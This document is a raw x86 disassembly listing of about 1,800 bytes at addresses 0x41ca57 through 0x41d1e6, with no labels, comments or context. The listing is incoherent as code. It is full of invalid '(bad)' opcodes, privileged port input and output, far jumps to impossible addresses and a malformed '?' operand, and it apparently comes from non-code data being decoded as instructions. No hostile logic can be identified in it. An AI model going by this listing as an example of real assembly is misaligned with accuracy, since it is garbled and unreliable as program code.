  41ca57:	add    BYTE PTR [eax-0x6aef22f6],dl
  41ca5d:	jmp    0x41cab7
  41ca5f:	push   edx
  41ca60:	xchg   ebx,eax
  41ca61:	addr16 pop ds
  41ca63:	adc    DWORD PTR [ebp+0x1b03ee79],edi
  41ca69:	mov    ecx,0x43e9058
  41ca6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca6f:	sub    eax,0x45ca764
  41ca74:	mov    ah,ch
  41ca76:	inc    ebp
  41ca77:	pushw  es
  41ca79:	rol    BYTE PTR [esi],1
  41ca7b:	pop    ecx
  41ca7c:	cmp    BYTE PTR fs:[ebp+0x3],al
  41ca80:	pop    edx
  41ca81:	sar    DWORD PTR [ebx],cl
  41ca83:	cmc    
  41ca84:	xchg   ecx,eax
  41ca85:	test   BYTE PTR [eax-0x68f006ab],ch
  41ca8b:	out    dx,eax
  41ca8c:	ror    BYTE PTR [edi+ecx*2-0x36cd1b42],1
  41ca93:	pop    edx
  41ca94:	enter  0x5795,0xf9
  41ca98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca99:	stos   DWORD PTR es:[edi],eax
  41ca9a:	push   ebp
  41ca9b:	inc    ecx
  41ca9c:	mov    eax,0x7b187641
  41caa1:	adc    esi,ebp
  41caa3:	cmc    
  41caa4:	jbe    0x41caa8
  41caa6:	fldcw  WORD PTR [esi+0x682b9997]
  41caac:	lods   eax,DWORD PTR ds:[esi]
  41caad:	xchg   edi,eax
  41caae:	jb     0x41caa1
  41cab0:	(bad)  
  41cab1:	call   FWORD PTR [edi]
  41cab3:	retf   0x4fd5
  41cab6:	mov    al,ds:0xb5e42b02
  41cabb:	pop    esp
  41cabc:	sbb    esi,DWORD PTR [ebp+0x3c10088a]
  41cac2:	adc    eax,0x5451f381
  41cac7:	or     BYTE PTR [esp+ebx*1+0x1a8533fc],al
  41cace:	mov    al,ds:0xe629c43a
  41cad3:	mov    ds:0x438426d9,al
  41cad8:	sbb    edx,DWORD PTR [esi+0x166067b7]
  41cade:	ins    DWORD PTR es:[edi],dx
  41cadf:	pushf  
  41cae0:	xlat   BYTE PTR ds:[ebx]
  41cae1:	ret    
  41cae2:	add    dl,BYTE PTR [esi]
  41cae4:	imul   esp,esi,0xbc1aa831
  41caea:	repnz fdivr QWORD PTR fs:[eax+esi*1-0x79]
  41caf0:	je     0x41caed
  41caf2:	(bad)  
  41caf3:	inc    DWORD PTR [edi]
  41caf5:	std    
  41caf6:	and    al,0x5f
  41caf8:	js     0x41cb55
  41cafa:	lea    ebx,[ecx+esi*8+0x483a2611]
  41cb01:	(bad)  
  41cb03:	popf   
  41cb04:	pop    esi
  41cb05:	and    eax,0xf659f315
  41cb0a:	fdivr  QWORD PTR es:[ebx]
  41cb0d:	mov    dh,0x38
  41cb0f:	mov    bh,cl
  41cb11:	xchg   ebx,eax
  41cb12:	adc    eax,0xfdd4e76f
  41cb17:	int3   
  41cb18:	xchg   edi,eax
  41cb19:	dec    eax
  41cb1a:	xor    al,0x36
  41cb1c:	jo     0x41cb7b
  41cb1e:	mov    ch,BYTE PTR [ecx+0x4a]
  41cb21:	jmp    0xd201:0x81adbc91
  41cb28:	js     0x41cba9
  41cb2a:	sub    ch,BYTE PTR [ebp-0x6a]
  41cb2d:	pop    edi
  41cb2e:	daa    
  41cb2f:	xlat   BYTE PTR ds:[ebx]
  41cb30:	cs dec ecx
  41cb32:	jae    0x41cb1c
  41cb34:	or     dh,BYTE PTR [ebp+0xc8b7481]
  41cb3a:	out    0x93,al
  41cb3c:	mov    al,0x1d
  41cb3e:	das    
  41cb3f:	add    ebx,ebx
  41cb41:	dec    esi
  41cb42:	retf   
  41cb43:	ja     0x41caf5
  41cb45:	stos   DWORD PTR es:[edi],eax
  41cb46:	jae    0x41cbb0
  41cb48:	cwde   
  41cb49:	cmp    BYTE PTR [ebx-0x1aab6eee],cl
  41cb4f:	mov    ch,0xf0
  41cb51:	loopne 0x41cb81
  41cb53:	push   cs
  41cb54:	push   esi
  41cb55:	test   BYTE PTR [esi-0x8c7daa],0xb7
  41cb5c:	pop    ecx
  41cb5d:	fimul  DWORD PTR [esi]
  41cb5f:	jbe    0x41cb31
  41cb61:	mov    cs,ebx
  41cb63:	push   ebx
  41cb64:	and    eax,0x8c5daa1
  41cb69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb6a:	mov    ds:0x79e13683,al
  41cb6f:	out    dx,al
  41cb70:	imul   ecx,DWORD PTR [eax],0xf42e7c3f
  41cb76:	ins    DWORD PTR es:[edi],dx
  41cb77:	call   0x70957247
  41cb7c:	daa    
  41cb7d:	outs   dx,BYTE PTR ds:[esi]
  41cb7e:	mov    al,0x27
  41cb80:	dec    edi
  41cb81:	mov    bh,0x38
  41cb83:	bound  edi,QWORD PTR [edx+0x6d]
  41cb86:	adc    al,0x9c
  41cb88:	ja     0x41cb4b
  41cb8a:	cli    
  41cb8b:	imul   BYTE PTR [esi-0x6e]
  41cb8e:	jae    0x41cb56
  41cb90:	test   eax,0x5406f996
  41cb95:	mov    bh,0xf0
  41cb97:	clc    
  41cb98:	imul   edi,ebx,0xd8aa3115
  41cb9e:	bnd jge 0x41cb69
  41cba1:	aas    
  41cba2:	mov    esp,0x43ad7eb9
  41cba7:	jnp    0x41cc27
  41cba9:	cmp    BYTE PTR ds:[esi+0x2e],dh
  41cbad:	fmul   QWORD PTR [eax-0x41c7ebe2]
  41cbb3:	sub    eax,0x26840709
  41cbb8:	aaa    
  41cbb9:	or     bl,ch
  41cbbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbbc:	push   eax
  41cbbd:	adc    dh,BYTE PTR [ebx+0x5009754f]
  41cbc3:	push   0xffffffe7
  41cbc5:	jns    0x41cbc4
  41cbc7:	jo     0x41cb95
  41cbc9:	jle    0x41cba0
  41cbcb:	ror    BYTE PTR ds:0x6221e7ac,cl
  41cbd1:	jmp    0x41cb9d
  41cbd3:	jmp    0xda3aee85
  41cbd8:	mov    eax,ds:0x3e7e962e
  41cbdd:	cmp    dl,bl
  41cbdf:	mov    edi,0xa8328946
  41cbe4:	add    edi,DWORD PTR [ebx]
  41cbe6:	fcmovbe st,st(7)
  41cbe8:	cmp    DWORD PTR [ebx],edx
  41cbea:	icebp  
  41cbeb:	cwde   
  41cbec:	stos   DWORD PTR es:[edi],eax
  41cbed:	or     BYTE PTR [ebp+0x3c],0x13
  41cbf1:	enter  0x9177,0xb3
  41cbf5:	or     DWORD PTR [edi-0x5e],0x4a7f9b9f
  41cbfc:	mov    edx,0x354d9b9
  41cc01:	pop    edi
  41cc02:	adc    al,0x7f
  41cc04:	pop    ss
  41cc05:	sub    eax,0xa7c4275c
  41cc0a:	push   ebp
  41cc0b:	daa    
  41cc0c:	retf   0xebe2
  41cc0f:	mov    BYTE PTR [edx-0x2e],ah
  41cc12:	imul   esp,eax,0xfffffffe
  41cc15:	aas    
  41cc16:	sub    al,0xf8
  41cc18:	(bad)  
  41cc19:	cmp    al,BYTE PTR [eax-0x3c8a4836]
  41cc1f:	je     0x41cc14
  41cc21:	or     eax,0x15250212
  41cc26:	neg    DWORD PTR [edi-0x3900b378]
  41cc2c:	xchg   DWORD PTR [eax+0x2],ebx
  41cc2f:	shr    DWORD PTR [ebx-0x5e],0xfe
  41cc33:	fwait
  41cc34:	imul   esi,DWORD PTR [esi],0xc6650008
  41cc3a:	jp     0x41cc87
  41cc3c:	jne    0x41cc4c
  41cc3e:	ins    BYTE PTR es:[edi],dx
  41cc3f:	icebp  
  41cc40:	dec    esi
  41cc41:	mov    ch,BYTE PTR [ebx+0x3d364d14]
  41cc47:	or     DWORD PTR [edx+0x32c77195],edi
  41cc4d:	xor    eax,0xa3c39bd0
  41cc52:	fs push esp
  41cc54:	cmp    BYTE PTR [ecx],dl
  41cc56:	lea    ebp,[esi+0x4d06343e]
  41cc5c:	lods   eax,DWORD PTR ds:[esi]
  41cc5d:	aad    0x45
  41cc5f:	jb     0x41cbf6
  41cc61:	jbe    0x41cc76
  41cc63:	mov    ah,0x88
  41cc65:	xchg   BYTE PTR ds:0x8e7f01ed,cl
  41cc6b:	(bad)  
  41cc6c:	push   esp
  41cc6d:	or     eax,0x51c4f1e3
  41cc72:	sub    al,0x3d
  41cc74:	inc    ebx
  41cc75:	mov    ah,0xd4
  41cc77:	mov    dl,0x5
  41cc79:	test   eax,0x3d46857f
  41cc7e:	mov    ebx,DWORD PTR [ebx+0x11d84d97]
  41cc84:	push   esp
  41cc85:	dec    esp
  41cc86:	xor    al,0x48
  41cc88:	lock push 0x56
  41cc8b:	scas   al,BYTE PTR es:[edi]
  41cc8c:	out    dx,al
  41cc8d:	or     al,0xf5
  41cc8f:	ds pop ss
  41cc91:	lahf   
  41cc92:	fs fwait
  41cc94:	or     eax,0x46aac89c
  41cc99:	sub    al,0x59
  41cc9b:	xor    al,0x18
  41cc9d:	inc    ecx
  41cc9e:	mov    ds:0x2662cfaf,al
  41cca3:	cmp    BYTE PTR [ebx+0x34086011],ah
  41cca9:	mov    dh,0xaa
  41ccab:	repnz mov edi,0xa1c462db
  41ccb1:	in     al,0xa3
  41ccb3:	or     DWORD PTR [edi],esi
  41ccb5:	mov    ds:0x7773b453,al
  41ccba:	fld    QWORD PTR [ecx+0x2c040e77]
  41ccc0:	add    eax,0x9dd9e38a
  41ccc5:	daa    
  41ccc6:	loopne 0x41ccbc
  41ccc8:	ror    DWORD PTR [ecx],0x46
  41cccb:	sar    dl,1
  41cccd:	push   edx
  41ccce:	outs   dx,BYTE PTR ds:[esi]
  41cccf:	push   cs
  41ccd0:	inc    ecx
  41ccd1:	xlat   BYTE PTR ds:[ebx]
  41ccd2:	mov    al,ds:0x8b2c1a8d
  41ccd7:	(bad)  
  41ccd8:	mov    eax,ds:0x54540c
  41ccdd:	scas   al,BYTE PTR es:[edi]
  41ccde:	mov    al,ds:0xbe3d50e8
  41cce3:	stos   BYTE PTR es:[edi],al
  41cce4:	out    0x54,al
  41cce6:	clc    
  41cce7:	push   es
  41cce8:	mov    ds:0x7638da73,eax
  41cced:	scas   eax,DWORD PTR es:[edi]
  41ccee:	test   DWORD PTR [eax],edi
  41ccf0:	inc    esi
  41ccf1:	xor    BYTE PTR ds:0x3fc5c7e3,dl
  41ccf7:	sti    
  41ccf8:	int    0x7f
  41ccfa:	addr16 dec esp
  41ccfc:	std    
  41ccfd:	sbb    dl,BYTE PTR [ebx+0x59]
  41cd00:	mul    ah
  41cd02:	sub    bl,cl
  41cd04:	mov    ah,0x12
  41cd06:	retf   0x8835
  41cd09:	add    DWORD PTR ds:0x47c80974,edi
  41cd0f:	jnp    0x41cca4
  41cd11:	jae    0x41cd71
  41cd13:	lds    edx,FWORD PTR [ecx-0x58]
  41cd16:	dec    edx
  41cd17:	daa    
  41cd18:	ret    0x760a
  41cd1b:	inc    ebx
  41cd1c:	int3   
  41cd1d:	add    BYTE PTR [edx+0xa726f4c],ah
  41cd23:	jl     0x41cd68
  41cd25:	jle    0x41cd0c
  41cd27:	clc    
  41cd28:	pop    esp
  41cd29:	xor    esp,DWORD PTR [ecx-0x3fa2c8e5]
  41cd2f:	sahf   
  41cd30:	xchg   ecx,eax
  41cd31:	jno    0x41cd58
  41cd33:	fnstenv [edi+edi*4]
  41cd36:	mov    ebp,0x441733e1
  41cd3b:	mov    ds:0xef4fa018,eax
  41cd40:	cli    
  41cd41:	mov    eax,ds:0x2c388385
  41cd46:	btc    DWORD PTR [edx-0x71],ebx
  41cd4a:	jo     0x41cd1e
  41cd4c:	sbb    dl,BYTE PTR ds:0x59d7a035
  41cd52:	xor    DWORD PTR [esi],esi
  41cd54:	mov    dh,BYTE PTR [ecx+0x28]
  41cd57:	jp     0x41cd5c
  41cd59:	or     al,0x14
  41cd5b:	lea    esp,ds:0x6701d20e
  41cd61:	mov    cl,0x36
  41cd63:	xchg   ebp,eax
  41cd64:	test   bl,0x5b
  41cd67:	mov    ebx,0xbd3c98a2
  41cd6c:	idiv   DWORD PTR [ebp-0x4b]
  41cd6f:	out    0x47,al
  41cd71:	je     0x41cd0f
  41cd73:	pop    ss
  41cd74:	adc    al,0xaa
  41cd76:	daa    
  41cd77:	pop    esi
  41cd78:	in     al,dx
  41cd79:	stos   BYTE PTR es:[edi],al
  41cd7a:	mov    ds:0x31d83644,eax
  41cd7f:	dec    edx
  41cd80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd81:	mov    es,ecx
  41cd83:	add    eax,0x511676a2
  41cd88:	pusha  
  41cd89:	sar    ah,0xc6
  41cd8c:	or     eax,DWORD PTR ds:0x4d644dee
  41cd92:	daa    
  41cd93:	aaa    
  41cd94:	mov    bh,0x6f
  41cd96:	sub    DWORD PTR [edx],0x2ebfe4e2
  41cd9c:	push   esp
  41cd9d:	out    dx,eax
  41cd9e:	sbb    BYTE PTR [edx],ah
  41cda0:	fwait
  41cda1:	out    dx,al
  41cda2:	adc    eax,0x413efac7
  41cda7:	in     al,dx
  41cda8:	mov    eax,0x2f10893e
  41cdad:	(bad)  
  41cdae:	push   ss
  41cdaf:	dec    ebx
  41cdb0:	jg     0x41cd8d
  41cdb2:	pop    esi
  41cdb3:	sbb    eax,0x81c359d3
  41cdb8:	sar    BYTE PTR [edi],1
  41cdba:	into   
  41cdbb:	out    0xb0,al
  41cdbd:	xor    dh,ch
  41cdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc0:	lock push eax
  41cdc2:	loop   0x41cd66
  41cdc4:	test   BYTE PTR ds:0xc315548d,0x35
  41cdcb:	xchg   esp,eax
  41cdcc:	adc    al,BYTE PTR [ecx]
  41cdce:	popa   
  41cdcf:	add    cl,ah
  41cdd1:	(bad)  
  41cdd2:	lds    ebx,FWORD PTR [ebp+0x72]
  41cdd5:	rcr    DWORD PTR [ebx],cl
  41cdd7:	xchg   dl,al
  41cdd9:	rol    BYTE PTR [ebx],0xcf
  41cddc:	sbb    eax,0xa8928db1
  41cde1:	aas    
  41cde2:	pop    esp
  41cde3:	int3   
  41cde4:	xlat   BYTE PTR ds:[ebx]
  41cde5:	hlt    
  41cde6:	jmp    0x7e30e4e6
  41cdeb:	nop
  41cdec:	dec    esi
  41cded:	dec    edx
  41cdee:	repnz jmp 0xc3ff:0x76d26941
  41cdf6:	xor    esi,DWORD PTR [ebx+0x2e]
  41cdf9:	sbb    eax,0x66d4c9a8
  41cdfe:	lahf   
  41cdff:	mov    cl,0xf
  41ce01:	sub    BYTE PTR [edx],dh
  41ce03:	mov    ecx,0x9332e682
  41ce08:	push   edi
  41ce09:	daa    
  41ce0a:	stos   BYTE PTR es:[edi],al
  41ce0b:	add    bl,BYTE PTR gs:[ebx+0x29]
  41ce0f:	pop    esi
  41ce10:	out    0xbe,eax
  41ce12:	xchg   edi,eax
  41ce13:	stos   DWORD PTR es:[edi],eax
  41ce14:	xchg   DWORD PTR [ecx+0x2b],ecx
  41ce17:	jae    0x41cdf5
  41ce19:	mov    cl,0xe
  41ce1b:	pop    ds
  41ce1c:	sbb    eax,0xc6563354
  41ce21:	in     eax,dx
  41ce22:	(bad)  
  41ce23:	sub    cl,BYTE PTR [ebp+0x2f]
  41ce26:	shr    dh,0x2c
  41ce29:	jg     0x41ce82
  41ce2b:	pop    ss
  41ce2c:	out    0x50,eax
  41ce2e:	dec    eax
  41ce2f:	adc    ecx,edi
  41ce31:	dec    esi
  41ce32:	rol    BYTE PTR [ebp-0x287acb7c],1
  41ce38:	retf   
  41ce39:	mov    al,0xad
  41ce3b:	sbb    edi,DWORD PTR [ebx+esi*2-0x77]
  41ce3f:	xchg   BYTE PTR [edx],al
  41ce41:	xor    cl,BYTE PTR [edx]
  41ce43:	sub    DWORD PTR ss:[esi+0x6e113ad3],esp
  41ce4a:	sbb    DWORD PTR [eax-0x10],esi
  41ce4d:	jmp    0x629d:0x2fb79d96
  41ce54:	out    dx,eax
  41ce55:	mov    ah,0xa6
  41ce57:	dec    eax
  41ce58:	inc    edx
  41ce59:	inc    ebx
  41ce5a:	cmp    al,0x4b
  41ce5c:	pop    es
  41ce5d:	mov    dh,0xe5
  41ce5f:	sbb    BYTE PTR [esi+0x43],0xca
  41ce63:	mov    DWORD PTR ds:0x8db87857,ecx
  41ce69:	les    esi,FWORD PTR [eax]
  41ce6b:	mov    ah,0xba
  41ce6d:	fbstp  TBYTE PTR ds:[esi+0x4a]
  41ce71:	or     eax,0xd7fc1fdd
  41ce76:	mov    edi,fs
  41ce78:	push   cs
  41ce79:	sub    ah,ah
  41ce7b:	sbb    DWORD PTR [eax-0x3f],ebx
  41ce7e:	xor    dh,BYTE PTR [esi+ebx*1-0x4445f710]
  41ce85:	push   0xffffff94
  41ce87:	in     al,dx
  41ce88:	ja     0x41ceca
  41ce8a:	sub    cl,ah
  41ce8c:	cld    
  41ce8d:	inc    eax
  41ce8e:	(bad)  
  41ce8f:	in     eax,0x9b
  41ce91:	setns  BYTE PTR [edx+esi*1]
  41ce95:	inc    eax
  41ce96:	mov    ds:0xc663d1e9,eax
  41ce9b:	daa    
  41ce9c:	imul   ebp,DWORD PTR [edx-0x77],0xffffffdd
  41cea0:	mov    WORD PTR [ebp-0x7b],cs
  41cea3:	loope  0x41cf13
  41cea5:	aad    0xe3
  41cea7:	sbb    eax,0xb11e81a2
  41ceac:	push   edx
  41cead:	inc    esi
  41ceae:	mov    ah,0xd1
  41ceb0:	or     eax,0x31854d3d
  41ceb5:	sahf   
  41ceb6:	dec    ebp
  41ceb7:	ret    0x4650
  41ceba:	(bad)  
  41cebb:	test   eax,0x6fb65c94
  41cec0:	ins    DWORD PTR es:[edi],dx
  41cec1:	adc    esi,DWORD PTR [ebp-0x6a7515d4]
  41cec7:	adc    bh,BYTE PTR [ebx-0x27]
  41ceca:	sub    al,0xc0
  41cecc:	dec    ecx
  41cecd:	dec    edi
  41cece:	and    bh,BYTE PTR [eax+0x5a114e5c]
  41ced4:	pop    edx
  41ced5:	fbld   TBYTE PTR [esp+eax*1]
  41ced8:	dec    edi
  41ced9:	cld    
  41ceda:	popf   
  41cedb:	cmp    al,0xdc
  41cedd:	and    eax,0x5302fed7
  41cee2:	mov    dh,0xc0
  41cee4:	outs   dx,DWORD PTR ds:[esi]
  41cee5:	xchg   edi,eax
  41cee6:	mov    ch,0x85
  41cee8:	push   eax
  41cee9:	fs imul eax,esi,0x70
  41ceed:	lahf   
  41ceee:	into   
  41ceef:	push   esp
  41cef0:	cmp    DWORD PTR [esi+0x16],ebp
  41cef3:	cmp    edx,DWORD PTR [edi]
  41cef5:	cwde   
  41cef6:	enter  0xc8b1,0x14
  41cefa:	push   edx
  41cefb:	into   
  41cefc:	sbb    DWORD PTR [edi+0x6f8ebd63],ecx
  41cf02:	mov    edi,0xd9d4654
  41cf07:	lahf   
  41cf08:	sbb    edx,DWORD PTR [ecx]
  41cf0a:	cld    
  41cf0b:	and    eax,DWORD PTR [edi]
  41cf0d:	fucom  st(4)
  41cf0f:	and    eax,0xb9b74549
  41cf14:	jmp    0xc58a4078
  41cf19:	jecxz  0x41cebb
  41cf1b:	test   eax,0xe9ebcd42
  41cf20:	mov    edx,edx
  41cf22:	jg     0x41cef6
  41cf24:	mov    edx,0x9944efa3
  41cf29:	add    BYTE PTR ds:0xbd3ecb5b,bl
  41cf2f:	ds push edi
  41cf31:	mov    DWORD PTR [eax+0x62],eax
  41cf34:	data16 js 0x41cf62
  41cf37:	outs   dx,DWORD PTR ds:[esi]
  41cf38:	stos   BYTE PTR es:[edi],al
  41cf39:	xor    al,0x79
  41cf3b:	xlat   BYTE PTR ds:[ebx]
  41cf3c:	mov    ah,0x96
  41cf3e:	dec    eax
  41cf3f:	cmp    al,0x32
  41cf41:	push   esi
  41cf42:	push   ecx
  41cf43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf44:	mov    ds:0x26e29e59,al
  41cf49:	je     0x41cf2b
  41cf4b:	jne    0x41cf0c
  41cf4d:	lahf   
  41cf4e:	dec    ebp
  41cf4f:	(bad)  
  41cf50:	adc    BYTE PTR [ebp-0x339111ac],dh
  41cf56:	mov    edx,0xfe030fda
  41cf5b:	mov    ebp,0x62e4b1be
  41cf60:	retf   0xe787
  41cf63:	int3   
  41cf64:	ficom  DWORD PTR [esi+0x1e]
  41cf67:	inc    ebp
  41cf68:	pusha  
  41cf69:	jg     0x41cfb1
  41cf6b:	pop    ds
  41cf6c:	sub    BYTE PTR [esi-0x2f],0x2c
  41cf70:	push   ebx
  41cf71:	mov    BYTE PTR ds:0xb12fe0ba,al
  41cf77:	ffreep st(0)
  41cf79:	push   edx
  41cf7a:	dec    DWORD PTR [eax]
  41cf7c:	arpl   WORD PTR [eax-0x3b99cd80],cx
  41cf82:	in     eax,0x3b
  41cf84:	fistp  QWORD PTR [ebp+0x6b]
  41cf87:	into   
  41cf88:	or     DWORD PTR [ebx+0x136305f7],eax
  41cf8e:	mov    ?,eax
  41cf90:	in     al,0x80
  41cf92:	or     DWORD PTR [ecx+eax*1-0x6956adb7],ecx
  41cf99:	mov    bl,0xb
  41cf9b:	ja     0x41d00e
  41cf9d:	xchg   ebp,eax
  41cf9e:	or     eax,0x9e3ddf4f
  41cfa4:	or     esi,ebx
  41cfa6:	test   BYTE PTR [edx+0x1333eb25],0xea
  41cfad:	add    edx,DWORD PTR [eax+0x7c]
  41cfb0:	bound  eax,QWORD PTR [esi+0x7f26eddc]
  41cfb6:	mov    DWORD PTR [ebx-0x67],0x1e4faa02
  41cfbd:	cmc    
  41cfbe:	jmp    0x41cfd0
  41cfc0:	xchg   edx,eax
  41cfc1:	xor    eax,0xb32e28ad
  41cfc6:	mov    al,0xad
  41cfc8:	pop    esi
  41cfc9:	push   edi
  41cfca:	push   ebp
  41cfcb:	pop    es
  41cfcc:	cwde   
  41cfcd:	fnop   
  41cfcf:	xor    eax,0xb85c8594
  41cfd4:	cmp    ebp,DWORD PTR [esi]
  41cfd6:	aas    
  41cfd7:	sub    eax,esp
  41cfd9:	push   edx
  41cfda:	outs   dx,DWORD PTR ds:[esi]
  41cfdb:	mov    cl,0x60
  41cfdd:	outs   dx,DWORD PTR ds:[esi]
  41cfde:	push   ebp
  41cfdf:	lods   al,BYTE PTR ds:[esi]
  41cfe0:	ret    
  41cfe1:	leave  
  41cfe2:	jmp    0x66027e7d
  41cfe7:	neg    edx
  41cfe9:	jmp    0x2ac06e7c
  41cfee:	add    esi,DWORD PTR [ebx+0x10]
  41cff1:	adc    DWORD PTR [ebp-0x7608ac61],ebp
  41cff7:	mov    al,gs:0x3acfb1e
  41cffd:	not    DWORD PTR [edx-0x5d]
  41d000:	inc    edx
  41d001:	scas   al,BYTE PTR es:[edi]
  41d002:	in     eax,dx
  41d003:	pop    ss
  41d004:	dec    eax
  41d005:	or     BYTE PTR [ebx-0x1b],ch
  41d008:	int3   
  41d009:	sub    bl,BYTE PTR [eax-0x36]
  41d00c:	test   DWORD PTR [ebx-0x68afe794],0x394f033f
  41d016:	cmp    al,ch
  41d018:	lock sti 
  41d01a:	loopne 0x41d08c
  41d01c:	out    dx,al
  41d01d:	xor    dh,BYTE PTR [ecx-0x80a13f2]
  41d023:	ins    DWORD PTR es:[edi],dx
  41d024:	jo     0x41d087
  41d026:	mov    edi,0x5a6d5a83
  41d02b:	push   ds
  41d02c:	and    ebx,edi
  41d02e:	fdiv   st(0),st
  41d030:	icebp  
  41d031:	mov    esp,0xcb2b7d0d
  41d036:	(bad)  
  41d037:	fcmovne st,st(2)
  41d039:	in     al,0xc
  41d03b:	pop    ss
  41d03c:	adc    al,0x9e
  41d03e:	sbb    al,cl
  41d040:	fsub   DWORD PTR [esi]
  41d042:	out    0x22,eax
  41d044:	ins    BYTE PTR es:[edi],dx
  41d045:	loope  0x41d01c
  41d047:	ja     0x41cff8
  41d049:	out    0xcd,eax
  41d04b:	paddsb mm5,mm1
  41d04e:	ret    
  41d04f:	lahf   
  41d050:	pop    ebx
  41d051:	lock xchg esp,eax
  41d053:	rcl    DWORD PTR [eax+0x398c7ff1],0x52
  41d05a:	push   edi
  41d05b:	sbb    DWORD PTR [ecx],eax
  41d05d:	jns    0x41d035
  41d05f:	xor    BYTE PTR [edx],0x2d
  41d062:	pop    ebp
  41d063:	mov    ebp,0x5061dab7
  41d068:	mov    ebp,0x2bb79194
  41d06d:	sbb    bl,0xd6
  41d070:	mov    ebp,eax
  41d072:	shl    BYTE PTR [ebp+0x3ce868e7],1
  41d078:	(bad)  
  41d079:	ffreep st(4)
  41d07b:	sbb    eax,0xe1500bf6
  41d080:	call   0x192dc851
  41d085:	pop    ebx
  41d086:	jo     0x41d048
  41d088:	adc    ecx,DWORD PTR [esi]
  41d08a:	xchg   ebp,eax
  41d08b:	xchg   edi,eax
  41d08c:	mov    ebx,0x4f97e41a
  41d091:	push   eax
  41d092:	dec    ebx
  41d093:	jp     0x41d076
  41d095:	clc    
  41d096:	mov    ecx,0xa1111ec2
  41d09b:	lds    ecx,FWORD PTR [edi-0x692b1f8f]
  41d0a1:	hlt    
  41d0a2:	out    0xdc,eax
  41d0a4:	sbb    al,0x32
  41d0a6:	je     0x41d081
  41d0a8:	outs   dx,DWORD PTR ds:[esi]
  41d0a9:	jmp    0x41d031
  41d0ab:	lahf   
  41d0ac:	pushf  
  41d0ad:	pop    esi
  41d0ae:	dec    ecx
  41d0af:	mov    eax,0x6cd7294a
  41d0b4:	xchg   ebx,eax
  41d0b5:	imul   ebp,DWORD PTR [edi+0x3e],0x414298ae
  41d0bc:	xor    eax,ebp
  41d0be:	mov    dl,0x62
  41d0c0:	mov    esi,0x4405315
  41d0c5:	das    
  41d0c6:	fnstcw WORD PTR [eax]
  41d0c8:	test   al,0x50
  41d0ca:	aad    0x24
  41d0cc:	xchg   ecx,eax
  41d0cd:	inc    ecx
  41d0ce:	mov    al,ds:0x1ea45fef
  41d0d3:	mov    ebp,0x7f6dd7e0
  41d0d8:	dec    ebx
  41d0d9:	or     al,0x9a
  41d0db:	cmp    al,0xa7
  41d0dd:	enter  0xf289,0x9e
  41d0e1:	loope  0x41d0f6
  41d0e3:	jmp    0x415b:0x14c99e99
  41d0ea:	fst    DWORD PTR [edi]
  41d0ec:	ret    0xb168
  41d0ef:	push   ds
  41d0f0:	sbb    al,0xc8
  41d0f2:	push   esi
  41d0f3:	repz fsub DWORD PTR [ecx+0x44bbefd0]
  41d0fa:	stos   BYTE PTR es:[edi],al
  41d0fb:	leave  
  41d0fc:	imul   edx,DWORD PTR [edi+ebp*4],0x3d1d98d3
  41d103:	push   ds
  41d104:	mov    ebp,0x2e11a165
  41d109:	xor    eax,0x2a31ba71
  41d10e:	lahf   
  41d10f:	pop    es
  41d110:	pop    edx
  41d111:	add    BYTE PTR [ebp+0x375947ad],ah
  41d117:	fidiv  WORD PTR [esi-0x2392de1b]
  41d11d:	fsub   QWORD PTR [ebx]
  41d11f:	or     esi,DWORD PTR [edx+0x1b4d070d]
  41d125:	fldcw  WORD PTR [edx-0x55]
  41d128:	xchg   esp,eax
  41d129:	and    ch,BYTE PTR [ebp+0x6fd9b803]
  41d12f:	add    eax,0xc2fdc91f
  41d134:	add    eax,0x2b78ce93
  41d139:	jns    0x41d19a
  41d13b:	mov    eax,ds:0xdeece06e
  41d140:	retf   0xe1bc
  41d143:	or     eax,0x2b8aef4b
  41d148:	mov    dl,bh
  41d14a:	rcl    DWORD PTR es:[ecx],0xb
  41d14e:	jnp    0x41d12e
  41d150:	adc    al,BYTE PTR [edi-0x2821a02]
  41d156:	dec    ebx
  41d157:	dec    ebx
  41d158:	fstp   QWORD PTR [esi+esi*1+0x20]
  41d15c:	mov    eax,ds:0x41294883
  41d161:	test   BYTE PTR ds:0x66aced5,0x43
  41d168:	fdiv   QWORD PTR [eax+0x2901a390]
  41d16e:	push   ss
  41d16f:	xchg   edx,eax
  41d170:	adc    BYTE PTR [eax+0x73],0x7b
  41d174:	outs   dx,BYTE PTR ds:[esi]
  41d175:	xor    edx,DWORD PTR [edi+0x6dd31f0e]
  41d17b:	inc    ecx
  41d17c:	or     esi,edi
  41d17e:	test   cl,bh
  41d180:	call   0xa21:0x93c3f14c
  41d187:	gs push ss
  41d189:	rcr    DWORD PTR [eax+ebx*2-0x62],0x69
  41d18e:	sbb    DWORD PTR [ebx+eiz*8+0x15],esi
  41d192:	shr    DWORD PTR [ebx],1
  41d194:	inc    eax
  41d195:	pop    esi
  41d196:	sub    edi,0x69fe2bb
  41d19c:	inc    edi
  41d19d:	push   eax
  41d19e:	cmp    eax,0xa88b8e7b
  41d1a3:	sub    edi,DWORD PTR [esi-0x5863d94]
  41d1a9:	adc    ebp,0x8c302438
  41d1af:	out    dx,eax
  41d1b0:	inc    ebx
  41d1b1:	push   esi
  41d1b2:	and    BYTE PTR [eax-0x5a],al
  41d1b5:	in     al,0x1d
  41d1b7:	mov    ?,WORD PTR [ebp-0x2e]
  41d1ba:	sbb    al,0x81
  41d1bc:	retf   0x6d54
  41d1bf:	jmp    ebx
  41d1c1:	push   esi
  41d1c2:	jb     0x41d16a
  41d1c4:	aam    0xeb
  41d1c6:	inc    ecx
  41d1c7:	and    ebx,0xffffff89
  41d1ca:	xchg   ecx,eax
  41d1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1cc:	jns    0x41d16a
  41d1ce:	jmp    0x74a3:0x317d508c
  41d1d5:	shr    BYTE PTR [ebp+0x1e],0xa5
  41d1d9:	push   ebp
  41d1da:	aaa    
  41d1db:	jno    0x41d229
  41d1dd:	aam    0x9b
  41d1df:	xchg   edx,eax
  41d1e0:	arpl   WORD PTR [eax+0x527c6a27],ax
  41d1e6:	fmul   st(2),st
